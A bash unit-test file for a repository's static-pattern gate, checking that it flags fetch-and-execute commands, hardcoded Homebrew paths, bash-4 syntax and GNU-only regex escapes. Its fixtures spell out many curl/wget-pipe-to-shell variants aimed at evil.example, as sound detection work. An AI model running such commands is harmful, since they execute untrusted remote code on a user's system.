#!/usr/bin/env bash

# SPDX-FileCopyrightText: 2026 Bruno Marques Venceslau de Souza <b@venceslau.dev>
#
# SPDX-License-Identifier: GPL-3.0-or-later

#
# Unit tests for bin/check-patterns (static-pattern gate). Proves the
# gate CATCHES a real curl|sh / wget|bash fetch, an ad-hoc `uname -m` outside
# lib/os.sh, a hardcoded Homebrew prefix, a `brew shellenv` fork and bash 4 syntax
# in the bash-3.2 surface; PASSES a clean tree, the sanctioned `uname -m` in
# lib/os.sh, and each of those literals where it is legitimate;
# SKIPS an absent optional dir (the fail-open regression that made the old inline
# recipe silently pass), FAILS CLOSED on a scan error, and refuses a no-op scan.
# Fixture trees only; never the real repo. Not on the shellcheck surface.
set -euo pipefail

repo_root="$(cd "$(dirname "$0")/.." && pwd)"
cp="$repo_root/bin/check-patterns"
[ -x "$cp" ] || { echo "FAIL: bin/check-patterns is not executable" >&2; exit 1; }

pass=0
fail() { echo "FAIL: $*" >&2; exit 1; }
ok()   { pass=$((pass + 1)); }

work="$(mktemp -d "${TMPDIR:-/tmp}/check_patterns_test.XXXXXX")"
# chmod back before rm: one case revokes read on a dir to force a scan error.
trap 'chmod -R u+rwx "$work" 2>/dev/null || true; rm -rf "$work"' EXIT INT TERM

# run ROOT -> echo check-patterns' exit code (never aborts under set -e). Clears an
# ambient STRICT so a "no STRICT" case is set by the CASE, not the environment: CI runs
# `make local-ci STRICT=1`, and make EXPORTS that into the test's env, which would
# otherwise leak into the STRICT-reading arm 5 and fail every fixture that
# plants no plugin shim files. run_strict() below is the explicit STRICT=1 form.
run() { local rc=0; STRICT= "$cp" "$1" >/dev/null 2>&1 || rc=$?; echo "$rc"; }
# same, with STRICT=1 exported to the gate ($cp is an external command, so the
# assignment prefix is inherited into its environment)
run_strict() { local rc=0; STRICT=1 "$cp" "$1" >/dev/null 2>&1 || rc=$?; echo "$rc"; }

# --- a clean tree passes (and carries the sanctioned uname -m in lib/os.sh) ---
r="$work/clean"; mkdir -p "$r/lib" "$r/bin"
printf '#!/bin/sh\necho hi\n' > "$r/install.sh"
printf 'is_arm() { case "$(uname -m)" in arm64) return 0 ;; esac ; }\n' > "$r/lib/os.sh"
[ "$(run "$r")" = "0" ] && ok || fail "a clean tree must pass"

# --- a real curl|sh fetch is caught ------------------------------------------
r="$work/curl"; mkdir -p "$r/lib"
printf 'noop() { : ; }\n' > "$r/lib/os.sh"
printf 'curl -fsSL https://evil.example/i.sh | sh\n' > "$r/lib/boot.sh"
[ "$(run "$r")" != "0" ] && ok || fail "a curl|sh fetch must fail the gate"

# --- a real wget|bash fetch is caught ----------------------------------------
r="$work/wget"; mkdir -p "$r/bin"
printf 'wget -qO- https://x.example/i | bash\n' > "$r/bin/tool"
[ "$(run "$r")" != "0" ] && ok || fail "a wget|bash fetch must fail the gate"

# --- a fetch EXECUTED through command or process substitution is caught -------
# No pipe after curl/wget, so the pipe arm alone passed every one of these
# (measured). One fixture file per shape, each in its own tree.
i=0
while IFS= read -r line; do
  i=$((i + 1)); r="$work/subst$i"; mkdir -p "$r/lib"
  printf 'noop() { : ; }\n' > "$r/lib/os.sh"
  printf '%s\n' "$line" > "$r/lib/boot.sh"
  [ "$(run "$r")" != "0" ] && ok || fail "an executed fetch must fail the gate: $line"
done <<'SHAPES'
sh -c "$(curl -fsSL https://evil.example/i.sh)"
bash -c "$(wget -qO- https://evil.example/i.sh)"
eval "$(curl -fsSL https://evil.example/i.sh)"
eval `curl -fsSL https://evil.example/i.sh`
source <(curl -fsSL https://evil.example/i.sh)
. <(curl -fsSL https://evil.example/i.sh)
bash <(wget -qO- https://evil.example/i.sh)
bash -lc "$(curl -fsSL https://evil.example/i.sh)"
zsh -ec "$(wget -qO- https://evil.example/i.sh)"
sh -c "$(command curl -fsSL https://evil.example/i.sh)"
bash -c "$(\curl -fsSL https://evil.example/i.sh)"
bash < <(curl -fsSL https://evil.example/i.sh)
\curl -fsSL https://evil.example/i.sh | sh
curl -fsSL https://evil.example/i.sh | sudo bash
curl -fsSL https://evil.example/i.sh | /bin/bash
wget -qO- https://evil.example/i.sh | env bash
bash -l -c "$(curl -fsSL https://evil.example/i.sh)"
bash --norc -c "$(curl -fsSL https://evil.example/i.sh)"
bash -c -- "$(curl -fsSL https://evil.example/i.sh)"
sh -c "  $(curl -fsSL https://evil.example/i.sh)"
eval "$(env curl -fsSL https://evil.example/i.sh)"
bash -c "$(/usr/bin/curl -fsSL https://evil.example/i.sh)"
curl -fsSL https://evil.example/i.sh | sudo -E bash
curl -fsSL https://evil.example/i.sh | sudo -u root bash
curl -fsSL https://evil.example/i.sh |& bash
curl -fsSL https://evil.example/i.sh | exec bash
curl -fsSL https://evil.example/i.sh | "bash"
curl -fsSL https://evil.example/i.sh | ksh
wget -qO- https://evil.example/i.sh | dash
bash <(sudo curl -fsSL https://evil.example/i.sh)
eval -- "$(curl -fsSL https://evil.example/i.sh)"
SHAPES

# --- capturing a download is NOT executing it (passes) -------------------------
r="$work/capture"; mkdir -p "$r/lib"
printf 'noop() { : ; }\n' > "$r/lib/os.sh"
printf '%s\n' 'body="$(curl -fsSL https://api.example/v1)"' 'medieval="$(wget -qO- https://x.example)"' \
  'bash -x "$(command -v curl)"' 'sh -e ./build.sh < "$(curl_cfg)"' \
  'curl -fsSL https://x.example/f | shasum -a 256' 'wget -qO- https://x.example | bashful' \
  'curl -fsSL https://x.example/f | tee out.log' 'curl -fsSL https://x.example/f | grep bash' > "$r/lib/fetch.sh"
[ "$(run "$r")" = "0" ] && ok || fail "capturing curl/wget output into a variable must pass"

# --- ad-hoc `uname -m` OUTSIDE lib/os.sh is caught ---------------------------
r="$work/uname"; mkdir -p "$r/lib" "$r/zsh"
printf 'noop() { : ; }\n' > "$r/lib/os.sh"
printf 'case "$(uname -m)" in arm64) A=1 ;; esac\n' > "$r/zsh/arch.zsh"
[ "$(run "$r")" != "0" ] && ok || fail "ad-hoc uname -m outside lib/os.sh must fail"

# --- the SAME `uname -m`, but INSIDE lib/os.sh, is sanctioned (passes) --------
r="$work/uname-ok"; mkdir -p "$r/lib"
printf 'case "$(uname -m)" in arm64) return 0 ;; esac\n' > "$r/lib/os.sh"
[ "$(run "$r")" = "0" ] && ok || fail "sanctioned uname -m in lib/os.sh must pass"

# --- REGRESSION: an absent optional dir (home/) must NOT mask a violation -----
# The old recipe passed `home` to grep unconditionally; a missing home made grep
# exit 2, which bash's `if grep` read as "no match", disabling BOTH checks. Here
# home/ is absent AND a real curl|sh is planted - the gate must still fail.
r="$work/regress"; mkdir -p "$r/lib"
printf 'noop() { : ; }\n' > "$r/lib/os.sh"
printf 'curl https://x | sh\n' > "$r/lib/boot.sh"
[ ! -e "$r/home" ] || fail "fixture bug: home/ should be absent for this case"
[ "$(run "$r")" != "0" ] && ok || fail "an absent home/ must not mask a real violation (fail-open regression)"

# --- FAIL CLOSED: an unreadable scanned dir errors the scan -> non-zero -------
if [ "$(id -u)" -ne 0 ]; then
  r="$work/failclosed"; mkdir -p "$r/lib/locked"
  printf 'noop() { : ; }\n' > "$r/lib/os.sh"
  chmod 000 "$r/lib/locked"
  [ "$(run "$r")" != "0" ] && ok || fail "an unreadable path must fail closed, not silently pass"
  chmod u+rwx "$r/lib/locked"
else
  # exempt: privilege (root) skip, not tool-availability
  echo "  SKIP: running as root - cannot exercise the unreadable-path fail-closed case"
fi

# --- a tree with no scan paths at all must refuse (no-op scan != pass) --------
r="$work/empty"; mkdir -p "$r"
[ "$(run "$r")" != "0" ] && ok || fail "a tree with no scan paths must not pass"

# --- rule 4: an UNESCAPED `#` inside a Makefile `$(shell ...)` is caught -------
# macOS system make (3.81) reads a bare `#` in a function argument as a comment and
# aborts ("unterminated call to function shell"); it MUST be escaped `\#`. Targeted at
# the Makefile (absent from the scan surface), so include a lib/os.sh so the scan is not
# a no-op refuse - this isolates the Makefile rule.
r="$work/mkhash"; mkdir -p "$r/lib"; printf 'noop() { : ; }\n' > "$r/lib/os.sh"
cat > "$r/Makefile" <<'EOF'
PY := $(shell head -1 x | grep -qE '^#!' && echo y)
EOF
[ "$(run "$r")" != "0" ] && ok || fail "an unescaped # inside a Makefile \$(shell ...) must fail the gate"

# the SAME line with the `#` ESCAPED (`\#`) passes - the fix, and proof it is not a
# blanket ban on `#` in the Makefile.
r="$work/mkhashok"; mkdir -p "$r/lib"; printf 'noop() { : ; }\n' > "$r/lib/os.sh"
cat > "$r/Makefile" <<'EOF'
PY := $(shell head -1 x | grep -qE '^\#!' && echo y)
EOF
[ "$(run "$r")" = "0" ] && ok || fail "an escaped \\# inside a Makefile \$(shell ...) must pass"

# a legit trailing `# comment` AFTER the `$(shell ...)` closes is not flagged (only a `#`
# INSIDE the call), and a Makefile with no `$(shell ...)` at all passes.
r="$work/mkcomment"; mkdir -p "$r/lib"; printf 'noop() { : ; }\n' > "$r/lib/os.sh"
cat > "$r/Makefile" <<'EOF'
FILES := $(shell ls)   # a normal make comment after the call
OTHER := plain value   # another comment
EOF
[ "$(run "$r")" = "0" ] && ok || fail "a trailing # comment after \$(shell ...) must not be flagged"

# the `${shell ...}` CURLY form is caught too - make accepts both `$(...)` and `${...}`.
r="$work/mkcurly"; mkdir -p "$r/lib"; printf 'noop() { : ; }\n' > "$r/lib/os.sh"
cat > "$r/Makefile" <<'EOF'
X := ${shell echo a#b}
EOF
[ "$(run "$r")" != "0" ] && ok || fail "an unescaped # inside a Makefile \${shell ...} must fail the gate"

# a comment GLUED to the closing `)` (no whitespace: `)#c`) is NOT flagged - the `#` is outside
# the call (a normal make comment). The char class excludes `)`/`}` so the gate does not
# over-flag this legit style (the reviewer's fail-closed false-positive fix).
r="$work/mkglued"; mkdir -p "$r/lib"; printf 'noop() { : ; }\n' > "$r/lib/os.sh"
cat > "$r/Makefile" <<'EOF'
FILES := $(shell ls)#c
EOF
[ "$(run "$r")" = "0" ] && ok || fail "a comment glued to the \$(shell ...) close ')#c' must not be flagged"

# === the pinned zsh-plugin shim-premise shape =============
# The gate asserts the startup fork the shim neutralizes is STILL in the pinned
# source, so a submodule bump re-verifies the shim. The fixture plants the plugin file
# under $r/zsh/plugins/ (explicit-path arm; the --exclude-dir=plugins on the shared
# arms does not reach a directly-named file).
fsh_rel="zsh/plugins/fast-syntax-highlighting/fast-syntax-highlighting.plugin.zsh"
plant_shims() {  # $1=root  $2=fsh-line
  mkdir -p "$1/lib" "$1/$(dirname "$fsh_rel")"
  printf 'noop() { : ; }\n' > "$1/lib/os.sh"
  printf '%s\n' "$2" > "$1/$fsh_rel"
}

# correct shape present -> pass (no false positive)
r="$work/shim-ok"
plant_shims "$r" 'if [[ $(uname -a) = (#i)*darwin* ]] {'
[ "$(run "$r")" = "0" ] && ok || fail "a correct shim-premise shape must pass"

# f-sy-h probe drifted ($(uname -s), not -a) -> the uname shim would stop covering it
r="$work/shim-uname-drift"
plant_shims "$r" 'if [[ $(uname -s) = (#i)*darwin* ]] {'
[ "$(run "$r")" != "0" ] && ok || fail 'a drifted f-sy-h uname probe (no $(uname -a)) must fail the gate'

# an ABSENT plugin submodule (uninitialized) is a loud SKIP normally, hard FAIL under STRICT
r="$work/shim-absent"; mkdir -p "$r/lib"; printf 'noop() { : ; }\n' > "$r/lib/os.sh"
[ "$(run "$r")" = "0" ] && ok || fail "an absent plugin submodule must pass (loud skip) without STRICT"
[ "$(run_strict "$r")" != "0" ] && ok || fail "an absent plugin submodule must FAIL under STRICT=1"

# --- shared fixture + a message-asserting runner --------------------------------
seed() {  # $1=root - the minimum tree the shared arms pass, so a case isolates ONE rule
  mkdir -p "$1/lib"
  printf 'noop() { : ; }\n' > "$1/lib/os.sh"
}
# fails_with ROOT MESSAGE LABEL - the gate must fail AND name the arm under test.
# A bare "exit != 0" can be satisfied by a DIFFERENT arm firing on something else in
# the fixture, which would let the case pass while the bug it guards is present.
fails_with() {
  local rc=0 out
  out="$(STRICT= "$cp" "$1" 2>&1)" || rc=$?
  [ "$rc" != "0" ] || fail "$3: the gate passed"
  case "$out" in
    *"$2"*) pass=$((pass + 1)) ;;
    *) fail "$3: expected the message '$2', got: $out" ;;
  esac
}
brew_msg="check-patterns: hardcoded Homebrew prefix"
fork_msg="check-patterns: a 'brew shellenv' / 'brew --prefix' fork"
b32_msg="check-patterns: bash 4 syntax in the bash-3.2 surface"

# === the Homebrew prefix arm ====================================================
# The prefix is /opt/homebrew on Apple Silicon and /usr/local on Intel and MUST be
# resolved by directory existence: a hardcoded arm64 prefix passes every gate on the
# Apple Silicon mac and breaks the Intel one silently. The gate reads the two prefixes
# as SEPARATE WORDS on one line as the detection shape, so a LONE /opt/homebrew is the
# violation.
r="$work/brew-lone"; seed "$r"; mkdir -p "$r/zsh"
printf 'path=(/opt/homebrew/bin $path)\n' > "$r/zsh/prefix.zsh"
fails_with "$r" "$brew_msg" "a lone /opt/homebrew"

# a trailing comment naming the Intel prefix does NOT buy an exemption - the comment
# tail is removed before the pair is looked for. This is the most natural thing an
# author writes next to the hardcode, so it is the case that matters most.
r="$work/brew-comment-dodge"; seed "$r"; mkdir -p "$r/zsh"
printf 'export HOMEBREW_PREFIX=/opt/homebrew  # or /usr/local on Intel\n' > "$r/zsh/prefix.zsh"
fails_with "$r" "$brew_msg" "a trailing comment must not exempt a hardcode"

# ...and neither does the `;#` form. The shell starts a comment after any unquoted
# metacharacter, not only after whitespace, so the splitter must know that too.
r="$work/brew-semi-dodge"; seed "$r"; mkdir -p "$r/zsh"
printf 'export HOMEBREW_PREFIX=/opt/homebrew;# or /usr/local on Intel\n' > "$r/zsh/prefix.zsh"
fails_with "$r" "$brew_msg" "a ';#' comment must not exempt a hardcode"

# naming BOTH prefixes inside ONE word is an unconditional hardcode, not detection.
r="$work/brew-both-one-word"; seed "$r"; mkdir -p "$r/zsh"
printf 'export PATH="/opt/homebrew/bin:/usr/local/bin:$PATH"\n' > "$r/zsh/prefix.zsh"
fails_with "$r" "$brew_msg" "both prefixes in one word must still fail"

# the exemption is ADJACENCY, not co-occurrence: an unrelated /usr/local elsewhere on
# the line (this repo really does use /usr/local/go/bin) must not exempt a hardcode.
r="$work/brew-coincidental"; seed "$r"; mkdir -p "$r/zsh"
printf '[ -d /usr/local/go ] && export HOMEBREW_PREFIX=/opt/homebrew\n' > "$r/zsh/prefix.zsh"
fails_with "$r" "$brew_msg" "a coincidental /usr/local must not exempt a hardcode"

# FAIL CLOSED on the ROOT's own path: the exemption is tested against the CODE alone,
# never the whole grep line, so a scan root that itself contains /usr/local cannot
# silently disable the arm for the entire tree.
r="$work/usr/local/rooted"; seed "$r"; mkdir -p "$r/zsh"
printf 'path=(/opt/homebrew/bin $path)\n' > "$r/zsh/prefix.zsh"
fails_with "$r" "$brew_msg" "a root path containing /usr/local must not disable the arm"

# the sanctioned shape: both prefixes as separate words (zsh/zshrc's real loop)
r="$work/brew-pair"; seed "$r"; mkdir -p "$r/zsh"
printf 'for prefix in /opt/homebrew /usr/local; do : ; done\n' > "$r/zsh/prefix.zsh"
[ "$(run "$r")" = "0" ] && ok || fail "the /opt/homebrew + /usr/local pair must pass"

# and the same shape inside a continued candidate list (zsh/fzf.zsh's real line)
r="$work/brew-pair-list"; seed "$r"; mkdir -p "$r/zsh"
printf '      /opt/homebrew/opt/fzf/shell /usr/local/opt/fzf/shell \\\n' > "$r/zsh/prefix.zsh"
[ "$(run "$r")" = "0" ] && ok || fail "a continued candidate pair must pass"

# prose that names one prefix is not a hardcode - CLAUDE.md REQUIRES the comment that
# explains the constraint, so flagging it would forbid documenting the rule.
r="$work/brew-comment"; seed "$r"; mkdir -p "$r/zsh"
printf '  # /opt/homebrew is the Apple Silicon prefix\n' > "$r/zsh/prefix.zsh"
[ "$(run "$r")" = "0" ] && ok || fail "a commented /opt/homebrew must pass"

# ...including as a TRAILING comment on a line of real code
r="$work/brew-trailing-ok"; seed "$r"; mkdir -p "$r/zsh"
printf 'p=$prefix/bin/brew  # never a hardcoded /opt/homebrew\n' > "$r/zsh/prefix.zsh"
[ "$(run "$r")" = "0" ] && ok || fail "a trailing comment naming the prefix must pass"

# ALLOWLIST: gpg-agent.conf has no variable expansion, so its absolute pinentry path
# cannot be prefix-detected.
r="$work/brew-gpg"; seed "$r"; mkdir -p "$r/config/gnupg"
printf 'pinentry-program /opt/homebrew/bin/pinentry-mac\n' > "$r/config/gnupg/gpg-agent.conf"
[ "$(run "$r")" = "0" ] && ok || fail "gpg-agent.conf's absolute pinentry path must pass (allowlisted)"

# ASYMMETRIC by design: /usr/local alone is a generic FHS path with non-Homebrew uses
# (zsh/zshenv's /usr/local/go/bin), so it is never flagged on its own.
r="$work/usrlocal-alone"; seed "$r"; mkdir -p "$r/zsh"
printf 'path=(/usr/local/go/bin $path)\n' > "$r/zsh/go.zsh"
[ "$(run "$r")" = "0" ] && ok || fail "a lone /usr/local must NOT be flagged"

# === the brew-fork arm ==========================================================
r="$work/shellenv"; seed "$r"; mkdir -p "$r/zsh"
printf 'eval "$(brew shellenv)"\n' > "$r/zsh/brew.zsh"
fails_with "$r" "$fork_msg" "a 'brew shellenv' fork"

# `brew --prefix` is the same fork asking the same question
r="$work/brewprefix"; seed "$r"; mkdir -p "$r/zsh"
printf 'export P="$(brew --prefix)"\n' > "$r/zsh/brew.zsh"
fails_with "$r" "$fork_msg" "a 'brew --prefix' fork"

# every OTHER brew call is untouched - `brew bundle` is how packages get installed
# `brew --prefix FORMULA` asks where a formula lives, which is a different question;
# flagging it would offer a remedy ("resolve by directory existence") that does not apply.
r="$work/brewformula"; seed "$r"
printf 'export OPENSSL_DIR="$(brew --prefix openssl@3)"\n' > "$r/lib/ssl.sh"
[ "$(run "$r")" = "0" ] && ok || fail "'brew --prefix <formula>' must pass"

r="$work/brewbundle"; seed "$r"
printf 'brew bundle --file "$DOTFILES/packages/Brewfile"\n' > "$r/lib/packages.sh"
[ "$(run "$r")" = "0" ] && ok || fail "'brew bundle' must pass (only prefix probes are forbidden)"

r="$work/shellenv-comment"; seed "$r"; mkdir -p "$r/zsh"
printf 'p=$prefix/bin/brew  # never via a brew shellenv fork\n' > "$r/zsh/brew.zsh"
[ "$(run "$r")" = "0" ] && ok || fail "a commented 'brew shellenv' must pass"

# === the bash-3.2 surface arm ===================================================
# macOS ships /bin/bash 3.2 and the installer runs under it. `make lint`'s
# `/bin/bash -n` cannot see any of these three: `declare -A` and `mapfile` are
# ordinary command invocations, and ${var,,} fails at expansion, not at parse. This
# arm is their only gate.
r="$work/b32-assoc"; seed "$r"
printf 'declare -A seen\n' > "$r/lib/tool.sh"
fails_with "$r" "$b32_msg" "an associative array in lib/"

r="$work/b32-mapfile"; seed "$r"
printf '#!/bin/sh\nmapfile -t lines < f\n' > "$r/install.sh"
fails_with "$r" "$b32_msg" "mapfile in install.sh"

r="$work/b32-case"; seed "$r"
printf 'x="${name,,}"\n' > "$r/lib/tool.sh"
fails_with "$r" "$b32_msg" '${var,,} in lib/'

# a POSITIONAL parameter is the most idiomatic use of the construct, so the
# parameter class must not be limited to names.
r="$work/b32-positional"; seed "$r"
printf 'lower="${1,,}"\n' > "$r/lib/tool.sh"
fails_with "$r" "$b32_msg" '${1,,} on a positional parameter'

# indirect expansion is bash 4 as well, and this arm is its only gate
r="$work/b32-indirect"; seed "$r"
printf 'x="${!v,,}"\n' > "$r/lib/tool.sh"
fails_with "$r" "$b32_msg" '${!v,,} through an indirection'

# bin/ is EXEMPT: those tools run only on a provisioned host or a CI runner.
r="$work/b32-bin-exempt"; seed "$r"; mkdir -p "$r/bin"
printf 'declare -A seen\nmapfile -t lines < f\nx="${name,,}"\n' > "$r/bin/tool"
[ "$(run "$r")" = "0" ] && ok || fail "bash 4 syntax under bin/ must pass (bin is exempt)"

# the headers that STATE the constraint spell the literals; they are not violations.
r="$work/b32-comment"; seed "$r"
printf '# Bash 3.2 compatible (no associative arrays, no mapfile, no ${var,,}).\n' > "$r/lib/tool.sh"
[ "$(run "$r")" = "0" ] && ok || fail "a comment spelling the bash-4 literals must pass"

# ...and neither is the same warning written as a TRAILING comment.
r="$work/b32-trailing-ok"; seed "$r"
printf 'x=$(printf %%s "$n" | tr A-Z a-z)  # bash 3.2: no ${name,,} here\n' > "$r/lib/tool.sh"
[ "$(run "$r")" = "0" ] && ok || fail "a trailing comment naming the bash-4 literals must pass"

# ...nor the `;#` form of the same warning.
r="$work/b32-semi-ok"; seed "$r"
printf 'x=1;# bash 3.2: no ${name,,} here, use tr\n' > "$r/lib/tool.sh"
[ "$(run "$r")" = "0" ] && ok || fail "a ';#' comment naming the bash-4 literals must pass"

# === the GNU-only regex escape arm ===============================================
# BSD sed and grep (macOS) implement POSIX regex. GNU's `\s \S \w \W \b \B \< \>`
# shorthands and its BRE `\| \+ \?` operators are extensions: on a mac the pattern
# silently means something else (a literal `s`, a literal `|`) and the command
# neither matches nor errors. Linux runs GNU tools, so no Linux run of the suite
# sees the break. This arm is the static half that does. Fixtures spell every
# escape through a double-quoted `\\`, so THIS file's own source never carries
# the single-backslash shape the arm looks for.
gnu_msg="check-patterns: a GNU-only regex escape"

# the exact line that failed on macOS: BSD `sed -E` has no `\s`, the substitution
# never matched, and the test read the whole loop line as its tool list.
r="$work/gnu-sed-s"; seed "$r"; mkdir -p "$r/tests"
printf '%s\n' "tools=\"\$(sed -E 's/^\\s*for tool in (.*); do\\s*\$/\\1/' <<<\"\$loop_line\")\"" > "$r/tests/x_test.sh"
fails_with "$r" "$gnu_msg" "sed -E with \\s in tests/"

# a word boundary in a gate's own pattern, on a CONTINUATION line that names no
# grep at all (bin/secret-scan's shape): the arm must not depend on the call word.
r="$work/gnu-grep-b"; seed "$r"; mkdir -p "$r/bin"
printf '%s\n' "_sc_grep \"\$f\" \"\$name\" 'aws' \\" "    '\\b(AKIA|ASIA)[0-9A-Z]{16}\\b' '' && hits=1" > "$r/bin/scan"
fails_with "$r" "$gnu_msg" "a \\b word boundary on a continuation line"

# a workflow step runs on the macOS runner, so it is on the surface too
r="$work/gnu-ci"; seed "$r"; mkdir -p "$r/.github/workflows"
printf '%s\n' "      - run: grep -qE '\\w+' file" > "$r/.github/workflows/ci.yml"
fails_with "$r" "$gnu_msg" "a \\w in a workflow run step"

# BRE alternation is a GNU extension: BSD grep reads `\|` as a literal bar
r="$work/gnu-bre-alt"; seed "$r"; mkdir -p "$r/tests"
printf '%s\n' "! grep -q '/Users/\\|/home/' \"\$f\"" > "$r/tests/x_test.sh"
fails_with "$r" "$gnu_msg" "a BRE \\| alternation"

# ...and so are the BRE `\?` and `\+` quantifiers, in either quote style
r="$work/gnu-bre-opt"; seed "$r"; mkdir -p "$r/tests"
printf '%s\n' "grep -qi \"ecosystem:[[:space:]]*x\\?y\" <<<\"\$c\"" > "$r/tests/x_test.sh"
fails_with "$r" "$gnu_msg" "a BRE \\? quantifier"

# the other quote character inside the pattern must not end the argument early
r="$work/gnu-bre-mixed-quote"; seed "$r"; mkdir -p "$r/tests"
printf '%s\n' "if grep -qi 'package-ecosystem:[[:space:]]*\"\\?gitsubmodule' <<<\"\$db\"; then" > "$r/tests/x_test.sh"
fails_with "$r" "$gnu_msg" "a BRE \\? after a \" inside a single-quoted pattern"

# the fix: POSIX classes and ERE operators mean the same thing on both platforms
r="$work/gnu-posix-ok"; seed "$r"; mkdir -p "$r/tests"
printf '%s\n' "sed -E 's/^[[:space:]]*for tool in (.*); do[[:space:]]*\$/\\1/'" \
  "grep -qE '(^|[^[:alnum:]_])AKIA[0-9A-Z]{16}([^[:alnum:]_]|\$)' f" \
  "grep -qE '/Users/|/home/' f" > "$r/tests/x_test.sh"
[ "$(run "$r")" = "0" ] && ok || fail "POSIX classes and ERE alternation must pass"

# inside an ERE, `\|` is an ESCAPED literal bar, portable on both platforms
r="$work/gnu-ere-literal-ok"; seed "$r"; mkdir -p "$r/tests"
printf '%s\n' "grep -Eq '\\|\\|[[:space:]]*(true|:)' f" "grep -cE '\\|\\| less' f" > "$r/tests/x_test.sh"
[ "$(run "$r")" = "0" ] && ok || fail "an escaped literal \\| inside grep -E must pass"

# a doubled backslash is a literal backslash, not a GNU escape
r="$work/gnu-literal-bs-ok"; seed "$r"; mkdir -p "$r/tests"
printf '%s\n' "grep -qF 'C:\\\\sys' f" > "$r/tests/x_test.sh"
[ "$(run "$r")" = "0" ] && ok || fail "a literal backslash before s must pass"

# the comment that explains the rule necessarily spells the escape
r="$work/gnu-comment-ok"; seed "$r"; mkdir -p "$r/tests"
printf '%s\n' "# POSIX classes, not \\s: BSD sed has no \\s" > "$r/tests/x_test.sh"
[ "$(run "$r")" = "0" ] && ok || fail "a comment naming \\s must pass"

# the pinned plugins are upstream's code, excluded like every other arm
r="$work/gnu-plugins-ok"; seed "$r"; mkdir -p "$r/zsh/plugins/p"
printf '%s\n' "sed -E 's/\\s+//'" > "$r/zsh/plugins/p/p.zsh"
[ "$(run "$r")" = "0" ] && ok || fail "a GNU escape inside zsh/plugins must pass (third-party)"

echo "PASS: check_patterns_test ($pass assertions)"
